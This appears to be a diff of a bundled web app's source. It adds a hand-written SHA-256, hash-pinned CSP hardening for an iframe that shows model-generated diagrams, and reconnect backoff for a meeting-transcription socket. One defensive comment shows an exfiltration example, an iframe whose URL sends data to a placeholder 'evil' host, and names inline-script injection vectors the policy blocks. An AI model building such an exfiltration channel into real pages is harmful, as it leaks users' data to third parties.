@@ -10491,6 +10491,144 @@ function escapeScriptClose(js) {
 	}
 	return out + js.slice(from);
 }
+// src/host/sha256Hex.ts
+/**
+* SHA-256 of a string's UTF-8 bytes, as 64 lowercase hex characters, computed
+* SYNCHRONOUSLY.
+*
+* The platform's `crypto.subtle.digest` is the obvious tool and is not used on
+* purpose: it is async, and the one caller (`storedName` in `ensureChatFolder.ts`)
+* derives a folder name inside synchronous code paths that run during render. A
+* folder name is derived rarely and from at most a few hundred bytes, so the cost
+* of a pure-TypeScript compression loop is irrelevant, and a collision-resistant
+* digest is what lets two long names that share a prefix be told apart without
+* trusting a 32-bit tag.
+*
+* FIPS 180-4, straight from the specification; the test file checks the published
+* vectors for the empty string and `abc`.
+*/
+var K = new Uint32Array([
+	1116352408,
+	1899447441,
+	3049323471,
+	3921009573,
+	961987163,
+	1508970993,
+	2453635748,
+	2870763221,
+	3624381080,
+	310598401,
+	607225278,
+	1426881987,
+	1925078388,
+	2162078206,
+	2614888103,
+	3248222580,
+	3835390401,
+	4022224774,
+	264347078,
+	604807628,
+	770255983,
+	1249150122,
+	1555081692,
+	1996064986,
+	2554220882,
+	2821834349,
+	2952996808,
+	3210313671,
+	3336571891,
+	3584528711,
+	113926993,
+	338241895,
+	666307205,
+	773529912,
+	1294757372,
+	1396182291,
+	1695183700,
+	1986661051,
+	2177026350,
+	2456956037,
+	2730485921,
+	2820302411,
+	3259730800,
+	3345764771,
+	3516065817,
+	3600352804,
+	4094571909,
+	275423344,
+	430227734,
+	506948616,
+	659060556,
+	883997877,
+	958139571,
+	1322822218,
+	1537002063,
+	1747873779,
+	1955562222,
+	2024104815,
+	2227730452,
+	2361852424,
+	2428436474,
+	2756734187,
+	3204031479,
+	3329325298
+]);
+var rotr = (x, n) => x >>> n | x << 32 - n;
+function sha256Hex(text) {
+	const bytes = new TextEncoder().encode(text);
+	const bitLen = bytes.length * 8;
+	const padded = new Uint8Array(bytes.length + 9 + 63 >> 6 << 6);
+	padded.set(bytes);
+	padded[bytes.length] = 128;
+	const view = new DataView(padded.buffer);
+	view.setUint32(padded.length - 4, bitLen >>> 0);
+	view.setUint32(padded.length - 8, Math.floor(bitLen / 4294967296));
+	const h = new Uint32Array([
+		1779033703,
+		3144134277,
+		1013904242,
+		2773480762,
+		1359893119,
+		2600822924,
+		528734635,
+		1541459225
+	]);
+	const w = /* @__PURE__ */ new Uint32Array(64);
+	for (let off = 0; off < padded.length; off += 64) {
+		for (let i = 0; i < 16; i++) w[i] = view.getUint32(off + i * 4);
+		for (let i = 16; i < 64; i++) {
+			const s0 = rotr(w[i - 15], 7) ^ rotr(w[i - 15], 18) ^ w[i - 15] >>> 3;
+			const s1 = rotr(w[i - 2], 17) ^ rotr(w[i - 2], 19) ^ w[i - 2] >>> 10;
+			w[i] = w[i - 16] + s0 + w[i - 7] + s1 >>> 0;
+		}
+		let [a, b, c, d, e, f, g, hh] = h;
+		for (let i = 0; i < 64; i++) {
+			const S1 = rotr(e, 6) ^ rotr(e, 11) ^ rotr(e, 25);
+			const ch = e & f ^ ~e & g;
+			const t1 = hh + S1 + ch + K[i] + w[i] >>> 0;
+			const t2 = (rotr(a, 2) ^ rotr(a, 13) ^ rotr(a, 22)) + (a & b ^ a & c ^ b & c) >>> 0;
+			hh = g;
+			g = f;
+			f = e;
+			e = d + t1 >>> 0;
+			d = c;
+			c = b;
+			b = a;
+			a = t1 + t2 >>> 0;
+		}
+		h[0] = h[0] + a >>> 0;
+		h[1] = h[1] + b >>> 0;
+		h[2] = h[2] + c >>> 0;
+		h[3] = h[3] + d >>> 0;
+		h[4] = h[4] + e >>> 0;
+		h[5] = h[5] + f >>> 0;
+		h[6] = h[6] + g >>> 0;
+		h[7] = h[7] + hh >>> 0;
+	}
+	let out = "";
+	for (let i = 0; i < 8; i++) out += h[i].toString(16).padStart(8, "0");
+	return out;
+}
 // src/lib/sketchSrcdoc.ts
 /** The runtime's served path under this build's base (the bare path in the stock build). */
 var MERMAID_RUNTIME_PATH = withBase(MERMAID_RUNTIME_PATH$1);
@@ -10498,7 +10636,8 @@ var MERMAID_RUNTIME_PATH = withBase(MERMAID_RUNTIME_PATH$1);
 * CSP for the sketch frame. `scriptOrigin` is the dashboard's own origin
 * (`window.location.origin`) — a null-origin document cannot use `'self'`, so
 * the origin is spelled out. The exported file (`buildSketchExport`) passes
-* `null`: its runtime is inlined, so `script-src` is `'unsafe-inline'` alone.
+* `null` and the hash of its inlined runtime instead: it has no origin to load
+* the runtime from.
 *
 * Each directive, and why it is exactly this:
 *
@@ -10508,18 +10647,17 @@ var MERMAID_RUNTIME_PATH = withBase(MERMAID_RUNTIME_PATH$1);
 *   `<iframe src="https://evil/?d=…">` is just as good an exfil channel as an
 *   image, and inheriting `'none'` blocks it without another directive to keep
 *   in sync.
-* - `script-src 'unsafe-inline' <origin><MERMAID_RUNTIME_PATH>` — pinned to the
-*   single vendored FILE, not to a bare origin and not to `https:`. Same
-*   least-privilege shape as `widgetSrcdoc.cspFor` pinning Tailwind: an injected
-*   document cannot pull arbitrary scripts from other dashboard endpoints, and
-*   crucially a script URL is itself an egress channel, so `script-src https:`
-*   would reopen the finding. `'unsafe-inline'` stays because OUR OWN inline
-*   bootstrap (`MERMAID_BOOTSTRAP_BODY`) is what drives Mermaid, and a `srcdoc`
-*   document has no response header to carry a nonce. Note what it no longer
-*   covers: the model's inline scripts are REMOVED from the document before it is
-*   serialized (`scrubModelDocument`), so `'unsafe-inline'` is a grant to our
-*   code, not to the model's. Replacing it with a build-time hash of that one
-*   literal is the follow-up that would retire the grant entirely.
+* - `script-src 'sha256-<bootstrap>' <origin><MERMAID_RUNTIME_PATH>` — the
+*   runtime is pinned to the single vendored FILE, not to a bare origin and not
+*   to `https:`. Same least-privilege shape as `widgetSrcdoc.cspFor` pinning
+*   Tailwind: an injected document cannot pull arbitrary scripts from other
+*   dashboard endpoints, and crucially a script URL is itself an egress channel,
+*   so `script-src https:` would reopen the finding. The exported file replaces
+*   the URL with `'sha256-<runtime>'`. Inline script runs only when its text
+*   hashes to one of OUR scripts, so `'unsafe-inline'` is NOT granted: model
+*   markup that survives `scrubModelDocument` still cannot run (inline
+*   `<script>`, `on*=` handlers — no `'unsafe-hashes'` — and `javascript:` URLs
+*   are all refused). The scrub stays as defense-in-depth.
 *   `'unsafe-eval'` is NOT granted — the vendored bundle contains zero
 *   `eval(` / `new Function` / `new Worker` / `importScripts` (verified against
 *   mermaid 11.13.0's `mermaid.min.js`), so the frame gets no dynamic-exec
@@ -10544,7 +10682,7 @@ var MERMAID_RUNTIME_PATH = withBase(MERMAID_RUNTIME_PATH$1);
 * - `base-uri 'none'` — a `<base href>` would re-point every relative URL in the
 *   document, including the Mermaid script path, at an attacker origin.
 */
-var cspFor = (scriptOrigin) => `default-src 'none'; script-src 'unsafe-inline'${scriptOrigin === null ? "" : ` ${scriptOrigin}${MERMAID_RUNTIME_PATH}`}; style-src 'unsafe-inline'; img-src data:; font-src data:; connect-src 'none'; form-action 'none'; base-uri 'none';`;
+var cspFor = (runtimeSource) => `default-src 'none'; script-src 'sha256-${MERMAID_BOOTSTRAP_HASH}' ${runtimeSource}; style-src 'unsafe-inline'; img-src data:; font-src data:; connect-src 'none'; form-action 'none'; base-uri 'none';`;
 /** Frame chrome only. Kept deliberately small so it cannot fight the agent's
 * own styling: page padding, a readable default face, and a rule that keeps a
 * wide diagram inside the panel instead of forcing a horizontal scrollbar. */
@@ -10621,6 +10759,22 @@ var MERMAID_BOOTSTRAP_BODY = `(function(){
   if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', start);
   else start();
 })();`;
+/**
+* The text a `<script>` holds once the frame re-parses the serialized document.
+* The HTML parser turns CR / CRLF into LF and NUL into U+FFFD before a script's
+* text exists, and a CSP hash is taken over THAT text — so the hash and the
+* `textContent` we set must both come from this form, or our own script is refused.
+*/
+var asParsedScript = (js) => js.replace(/\r\n?/g, "\n").replace(/\0/g, "�");
+/** Base64 SHA-256 of a script's text, as a CSP `'sha256-…'` source wants it. */
+function cspHash(js) {
+	const hex = sha256Hex(js);
+	let bytes = "";
+	for (let i = 0; i < hex.length; i += 2) bytes += String.fromCharCode(parseInt(hex.slice(i, i + 2), 16));
+	return btoa(bytes);
+}
+var MERMAID_BOOTSTRAP_SCRIPT = asParsedScript(MERMAID_BOOTSTRAP_BODY);
+var MERMAID_BOOTSTRAP_HASH = cspHash(MERMAID_BOOTSTRAP_SCRIPT);
 /**
 * Elements removed outright from the model document. Every one of them is
 * either a script host or a navigation/fetch primitive that would fire before
@@ -10781,7 +10935,7 @@ function scrubModelDocument(root) {
 	for (const el of Array.from(root.querySelectorAll(STRIPPED_TAGS.join(",")))) el.remove();
 	for (const el of Array.from(root.querySelectorAll("*"))) for (const attr of Array.from(el.attributes)) {
 		const name = attr.name.toLowerCase();
-		if (name.startsWith("on")) {
+		if (name.startsWith("on") || name === "integrity") {
 			el.removeAttribute(attr.name);
 			continue;
 		}
@@ -10841,15 +10995,18 @@ function buildSketchSrcdoc(html, scriptOrigin, inlineRuntime) {
 	const style = doc.createElement("style");
 	style.textContent = BASE_CSS;
 	head.appendChild(style);
+	let runtimeSource = `${scriptOrigin}${MERMAID_RUNTIME_PATH}`;
 	if (inlineRuntime === void 0) {
 		const mermaidPlaceholder = doc.createElement("meta");
 		mermaidPlaceholder.setAttribute("name", "x-script-placeholder");
 		mermaidPlaceholder.setAttribute("data-src", scriptOrigin + MERMAID_RUNTIME_PATH);
 		head.appendChild(mermaidPlaceholder);
 	} else {
+		const runtimeScript = asParsedScript(escapeScriptClose(inlineRuntime));
 		const runtime = doc.createElement("script");
-		runtime.textContent = escapeScriptClose(inlineRuntime);
+		runtime.textContent = runtimeScript;
 		head.appendChild(runtime);
+		runtimeSource = `'sha256-${cspHash(runtimeScript)}'`;
 	}
 	const range = doc.createRange();
 	range.selectNodeContents(body);
@@ -10857,11 +11014,11 @@ function buildSketchSrcdoc(html, scriptOrigin, inlineRuntime) {
 	scrubModelDocument(fragment);
 	body.appendChild(fragment);
 	const bootstrap = doc.createElement("script");
-	bootstrap.textContent = MERMAID_BOOTSTRAP_BODY;
+	bootstrap.textContent = MERMAID_BOOTSTRAP_SCRIPT;
 	body.appendChild(bootstrap);
 	const csp = doc.createElement("meta");
 	csp.setAttribute("http-equiv", "Content-Security-Policy");
-	csp.setAttribute("content", cspFor(inlineRuntime === void 0 ? scriptOrigin : null));
+	csp.setAttribute("content", cspFor(runtimeSource));
 	head.insertBefore(csp, head.firstChild);
 	const serialized = `<!DOCTYPE html>\n${doc.documentElement.outerHTML}`;
 	if (inlineRuntime !== void 0) return serialized;
@@ -15164,16 +15321,64 @@ var STOP_FRAME = JSON.stringify({ type: "stop" });
 /**
 * Server error codes that a reconnect cannot fix: a setting, a consent or a
 * package must change first. After one of these the hook halts instead of
-* reopening the socket (see `halted`). Every other code is retried.
+* reopening the socket (see `halted`). Every other code is retried, after
+* `reopenDelayMs` when the socket failed before `ready`.
+*
+* Includes the provider setup refusals the endpoint sends before `ready`: the
+* local recogniser that is missing or cannot run on this host, Apple Speech
+* that this macOS cannot run, and a Codex adapter that is missing, signed out
+* or unable to run on this host. Retryable codes are NOT here: `stt_codex_voice_unavailable`,
+* which the Codex client also sends for a transient RPC error; `stt_model_missing`,
+* because the endpoint starts the download when it refuses, and
+* `stt_import_failed`, because the engine also sends it for a model load that
+* timed out or is still running, which a later attempt finds resident.
 */
 var TERMINAL_ERROR_CODES = /* @__PURE__ */ new Set([
 	"stt_streaming_disabled",
 	"stt_consent_required",
 	"stt_aws_access_denied",
 	"stt_extra_missing",
+	"stt_no_wheel_for_platform",
+	"stt_unsupported_cpu",
+	"stt_load_crashed",
+	"stt_native_probe_crashed",
+	"stt_apple_unsupported",
+	"stt_apple_needs_toolchain",
+	"stt_codex_missing",
+	"stt_codex_extra_missing",
+	"stt_codex_login_required",
+	"stt_codex_sandbox_unavailable",
+	"stt_codex_cli_unresolved",
 	"stt_transcribe_vocabulary_rejected",
 	"stt_transcribe_sdk_outdated"
 ]);
+/** True for a failure fixed in Settings → Voice, so the meeting's notice links there. */
+function opensVoiceSettings(code) {
+	return code !== null && (code === "stt_model_missing" || TERMINAL_ERROR_CODES.has(code));
+}
+/** The wait before reopening after the first socket that failed before `ready`. */
+var REOPEN_BACKOFF_BASE_MS = 1e3;
+/** The longest wait between reopen attempts while every socket fails before `ready`. */
+var REOPEN_BACKOFF_MAX_MS = 3e4;
+/**
+* The longest wait after a refusal that clears on its own once the gateway is
+* ready: the model still downloading, or a model load still running. A short
+* cap keeps the meeting from missing much speech after the model lands.
+*/
+var REOPEN_BACKOFF_SOON_MAX_MS = 5e3;
+var SOON_RETRY_CODES = /* @__PURE__ */ new Set(["stt_model_missing", "stt_import_failed"]);
+/**
+* How long `start()` waits after *failures* consecutive sockets failed before
+* `ready`, the last with *code*: none for the first open, then 1 s, doubling,
+* capped at 5 s for a refusal that clears on its own and 30 s otherwise. A
+* failure that repeats would otherwise reopen the socket, and reach the user,
+* about once a second.
+*/
+function reopenDelayMs(failures, code = null) {
+	if (failures <= 0) return 0;
+	const cap = code !== null && SOON_RETRY_CODES.has(code) ? REOPEN_BACKOFF_SOON_MAX_MS : REOPEN_BACKOFF_MAX_MS;
+	return Math.min(REOPEN_BACKOFF_BASE_MS * 2 ** (failures - 1), cap);
+}
 /** Cap the locally buffered pre-`ready` audio at ~8s (16 kHz mono Int16 = 32 KB/s). */
 var MAX_BUFFERED_BYTES = 262144;
 /** Reconnect when the live socket has shown no sign of life for this long while recording. */
@@ -15393,6 +15598,39 @@ function useMeetingTranscription({ meetingId, onCaption, onFinal, onPartial, onC
 	onPartialRef.current = onPartial;
 	onCommittedRef.current = onCommitted;
 	onErrorRef.current = onError;
+	/** Consecutive live leases that failed before `ready`: the reopen backoff. */
+	const failedOpensRef = useRef(0);
+	/** True while the stall watchdog tears the live lease down; keeps a synchronous close from counting as a refusal. */
+	const stallTeardownRef = useRef(false);
+	/**
+	* The first code of the last lease that failed before `ready`, since the last
+	* `ready` or `stop()`. A reopen that fails the same way again is not reported
+	* again: the user already has that notice, and one per attempt reads as an
+	* error that never goes away. A different code, or a return to an earlier
+	* one, is reported.
+	*/
+	const lastFailureRef = useRef(null);
+	/** The pending reopen wait, cancelled by `cleanup()` (a stop or an unmount). */
+	const backoffRef = useRef(null);
+	/**
+	* Report why the live lease failed before `ready`, and count it once for the
+	* backoff. Every code of one lease (an open failure, then its close) shares
+	* the decision its first code made. A lease the user is stopping (pause or
+	* end) is reported and not counted, so resuming opens at once and reports.
+	*/
+	const reportOpenFailure = useCallback((lease, code) => {
+		if (lease.failedCode === null && stoppingRef.current) {
+			onErrorRef.current?.(code);
+			return;
+		}
+		if (lease.failedCode === null) {
+			lease.failedCode = code;
+			failedOpensRef.current += 1;
+			lease.failureReported = code !== lastFailureRef.current;
+			lastFailureRef.current = code;
+		}
+		if (lease.failureReported) onErrorRef.current?.(code);
+	}, []);
 	useEffect(() => {
 		dispatchBlockedRef.current = false;
 	}, [meetingId]);
@@ -15533,6 +15771,12 @@ function useMeetingTranscription({ meetingId, onCaption, onFinal, onPartial, onC
 	const cleanup = useCallback((abandonDrain = false) => {
 		teardownRef.current += 1;
 		clearWatchdog();
+		const backoff = backoffRef.current;
+		backoffRef.current = null;
+		if (backoff) {
+			clearTimeout(backoff.timer);
+			backoff.resolve();
+		}
 		for (const ref of [successorRef, activeRef]) {
 			clearLeaseTimers(ref.current);
 			try {
@@ -15616,6 +15860,8 @@ function useMeetingTranscription({ meetingId, onCaption, onFinal, onPartial, onC
 			buffer: [],
 			bufferedBytes: 0,
 			stopping: false,
+			failedCode: null,
+			failureReported: false,
 			holdExpired: false,
 			rotateTimer: null,
 			closeTimer: null,
@@ -15688,6 +15934,8 @@ function useMeetingTranscription({ meetingId, onCaption, onFinal, onPartial, onC
 					lease.capAt = Date.now() + maxDurationMs;
 					lease.rotateTimer = setTimeout(() => rotateRef.current(), Math.max(maxDurationMs - ROTATE_LEAD_MS, 1e3));
 				}
+				failedOpensRef.current = 0;
+				lastFailureRef.current = null;
 				lease.settle();
 				return;
 			}
@@ -15728,7 +15976,9 @@ function useMeetingTranscription({ meetingId, onCaption, onFinal, onPartial, onC
 			if (msg.type === "error") {
 				lease.settle();
 				if (isActive()) {
-					onErrorRef.current?.(msg.code || msg.message || "error");
+					const code = msg.code || msg.message || "error";
+					if (lease.ready) onErrorRef.current?.(code);
+					else reportOpenFailure(lease, code);
 					stoppingRef.current = true;
 					if (msg.code && TERMINAL_ERROR_CODES.has(msg.code)) {
 						setConnecting(false);
@@ -15753,7 +16003,10 @@ function useMeetingTranscription({ meetingId, onCaption, onFinal, onPartial, onC
 				return;
 			}
 			if (!isActive()) return;
-			if (!stoppingRef.current) onErrorRef.current?.("disconnected");
+			if (!stoppingRef.current) {
+				if (lease.ready || stallTeardownRef.current) onErrorRef.current?.("disconnected");
+				else reportOpenFailure(lease, "disconnected");
+			}
 			cleanup();
 		};
 		ws.onerror = () => {
@@ -15764,7 +16017,8 @@ function useMeetingTranscription({ meetingId, onCaption, onFinal, onPartial, onC
 				} catch {}
 				return;
 			}
-			onErrorRef.current?.("connection");
+			if (lease.ready) onErrorRef.current?.("connection");
+			else reportOpenFailure(lease, "connection");
 		};
 		return lease;
 	}, [
@@ -15772,7 +16026,8 @@ function useMeetingTranscription({ meetingId, onCaption, onFinal, onPartial, onC
 		dispatchInOrder,
 		dropSuccessor,
 		expireHold,
-		finishDrain
+		finishDrain,
+		reportOpenFailure
 	]);
 	rotateRef.current = () => {
 		if (stoppingRef.current || successorRef.current) return;
@@ -15793,6 +16048,20 @@ function useMeetingTranscription({ meetingId, onCaption, onFinal, onPartial, onC
 		stoppingRef.current = false;
 		finalsRef.current = [];
 		const teardown = teardownRef.current;
+		const backoffMs = reopenDelayMs(failedOpensRef.current, lastFailureRef.current);
+		if (backoffMs > 0) {
+			await new Promise((resolve) => {
+				const timer = setTimeout(() => {
+					backoffRef.current = null;
+					resolve();
+				}, backoffMs);
+				backoffRef.current = {
+					timer,
+					resolve
+				};
+			});
+			if (teardownRef.current !== teardown) return;
+		}
 		let stream;
 		try {
 			stream = await acquireMicStream();
@@ -15819,7 +16088,7 @@ function useMeetingTranscription({ meetingId, onCaption, onFinal, onPartial, onC
 				lease.ws.onopen = () => resolve();
 			});
 		} catch {
-			onErrorRef.current?.("connection");
+			reportOpenFailure(lease, "connection");
 			cleanup();
 			return;
 		}
@@ -15830,7 +16099,7 @@ function useMeetingTranscription({ meetingId, onCaption, onFinal, onPartial, onC
 			await ctx.audioWorklet.addModule(PCM_WORKLET_URL);
 		} catch {
 			if (ctxRef.current !== ctx) return;
-			onErrorRef.current?.("worklet");
+			reportOpenFailure(lease, "worklet");
 			cleanup();
 			return;
 		}
@@ -15863,7 +16132,13 @@ function useMeetingTranscription({ meetingId, onCaption, onFinal, onPartial, onC
 			if (stoppingRef.current || !activeRef.current) return;
 			const stallMs = Math.max(STALL_TIMEOUT_MS, ...[...drainsRef.current].map((l) => l.drainBudgetMs));
 			if (Date.now() - lastFrameRef.current > stallMs) {
-				cleanup();
+				stallTeardownRef.current = true;
+				try {
+					cleanup();
+				} finally {
+					stallTeardownRef.current = false;
+				}
+				failedOpensRef.current = 0;
 				start();
 			}
 		}, WATCHDOG_INTERVAL_MS);
@@ -15874,12 +16149,15 @@ function useMeetingTranscription({ meetingId, onCaption, onFinal, onPartial, onC
 	}, [
 		cleanup,
 		clearWatchdog,
-		openLease
+		openLease,
+		reportOpenFailure
 	]);
 	const stop = useCallback(() => {
 		stoppingRef.current = true;
 		haltedRef.current = false;
 		setHalted(false);
+		failedOpensRef.current = 0;
+		lastFailureRef.current = null;
 		clearWatchdog();
 		const pending = successorRef.current;
 		successorRef.current = null;
@@ -17282,7 +17560,7 @@ function MeetingView({ eventId, fallbackTitle, config, onBack, onOpenSettings, o
 						message: transcriptionErrorMessage,
 						onDismiss: dismissTranscriptionError,
 						className: "mx-4 mt-2 animate-rise",
-						footer: transcriptionErrorCode === "stt_streaming_disabled" ? /* @__PURE__ */ jsx("button", {
+						footer: opensVoiceSettings(transcriptionErrorCode) ? /* @__PURE__ */ jsx("button", {
 							type: "button",
 							className: "underline",
 							onClick: () => void leave(() => navigate(settingsPath({ tab: "voice" }))),
